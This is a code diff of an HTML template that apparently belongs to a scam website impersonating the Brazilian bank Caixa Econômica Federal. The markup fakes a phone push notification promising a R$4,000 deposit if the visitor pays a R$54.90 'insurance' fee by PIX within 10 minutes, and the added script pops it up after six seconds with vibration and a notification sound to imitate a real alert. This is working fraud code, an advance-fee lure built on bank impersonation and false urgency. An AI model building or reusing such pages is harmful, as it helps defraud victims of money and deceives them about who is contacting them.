@@ -408,27 +408,23 @@
 </head>
 <body>
     <!-- Notification -->
-    <div id="paymentNotification" class="notification">
-        <div class="notification-header">
-            <div class="notification-app-icon">
-                <i class="fas fa-bell" style="color: #1351b4;"></i>
-            </div>
-            <div class="notification-app-name">Caixa Econômica Federal</div>
-            <div class="notification-time">Agora</div>
-        </div>
-        <div class="notification-content">
-            <div class="notification-bank-logo">
-                <i class="fas fa-university" style="color: #1351b4; font-size: 24px;"></i>
-            </div>
-            <div class="notification-text-content">
-                <div class="notification-title">Você vai receber R$ 4.000,00</div>
-                <div class="notification-message">
-                    Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$54,90 para depositar R$4.000,00 em sua conta {{ bank|default("CAIXA ECONÔMICA FEDERAL") }}. Copie o código PIX e realize o pagamento em até 10 minutos ou a transacao será bloqueada.
+    <div id="paymentNotification" class="mt-4 mx-auto bg-white rounded-3xl p-3 shadow-lg notification" style="max-width: calc(100% - 25px); display: none; opacity: 0; transform: translateY(-100%);">
+        <div class="flex justify-between items-start">
+            <div class="flex-grow pr-2">
+                <div class="flex items-center mb-1 pl-2">
+                    <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
+                        <img src="https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg" alt="Bank logo" class="w-full h-full object-cover bank-image">
+                    </div>
+                    <span class="text-gray-700 text-sm">Caixa Econômica Federal • agora <i class="fas fa-chevron-down text-xs"></i></span>
                 </div>
+                <div class="text-black text-lg font-bold mb-0 pl-2">Você vai receber R$4.000,00</div>
+            </div>
+            <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
+                <img src="https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg" alt="Bank logo" class="w-full h-full object-cover bank-image">
             </div>
         </div>
-        <div class="touch-indicator">
-            Deslize para fechar
+        <div class="text-gray-600 text-sm w-full mt-0.5 pl-2 pr-2" style="word-break: break-word; max-width: 100%; line-height: 1.4; letter-spacing: -0.01em;">
+            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$54,90 para depositar R$4.000,00 em sua conta {{ bank|default("CAIXA ECONÔMICA FEDERAL") }}. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
         </div>
     </div>
 
@@ -607,6 +603,86 @@
     <audio id="notificationSound" preload="auto" style="display: none;">
         <source src="/static/sounds/notification.mp3" type="audio/mpeg">
     </audio>
+
+    <script>
+        function vibrateDevice() {
+            if ("vibrate" in navigator) {
+                navigator.vibrate(200);
+            }
+        }
+
+        const notification = document.getElementById('paymentNotification');
+
+        function showNotification() {
+            notification.style.display = 'block';
+            notification.style.animation = 'slideDown 0.3s ease-out forwards';
+            vibrateDevice();
+            
+            // Tentar reproduzir o som de notificação
+            const notificationSound = document.getElementById('notificationSound');
+            if (notificationSound) {
+                const playPromise = notificationSound.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(error => {
+                        console.log("Erro ao tocar som de notificação:", error);
+                    });
+                }
+            }
+            
+            setTimeout(() => {
+                if (notification.style.display !== 'none') {
+                    hideNotification('slideUp');
+                }
+            }, 12000);
+        }
+
+        function hideNotification(animationType) {
+            notification.style.animation = animationType + ' 0.3s ease-in forwards';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 300);
+        }
+
+        let startX, startY, moveX, moveY;
+
+        function setupSwipeToHide() {
+            notification.addEventListener('touchstart', (e) => {
+                startX = e.touches[0].clientX;
+                startY = e.touches[0].clientY;
+            });
+
+            notification.addEventListener('touchmove', (e) => {
+                moveX = e.touches[0].clientX;
+                moveY = e.touches[0].clientY;
+                
+                const diffX = moveX - startX;
+                const diffY = moveY - startY;
+
+                if (Math.abs(diffX) > 50 || diffY < -50) {
+                    // Determinar a direção do swipe
+                    if (Math.abs(diffX) > Math.abs(diffY)) {
+                        // Swipe horizontal
+                        if (diffX > 0) {
+                            hideNotification('slideRight');
+                        } else {
+                            hideNotification('slideLeft');
+                        }
+                    } else if (diffY < 0) {
+                        // Swipe para cima
+                        hideNotification('slideUp');
+                    }
+                }
+            });
+        }
+
+        // Setup swipe ao carregar a página
+        document.addEventListener('DOMContentLoaded', function() {
+            setupSwipeToHide();
+            
+            // Mostrar a notificação após 6 segundos
+            setTimeout(showNotification, 6000);
+        });
+    </script>
 
     <script>
             document.addEventListener('DOMContentLoaded', function() {
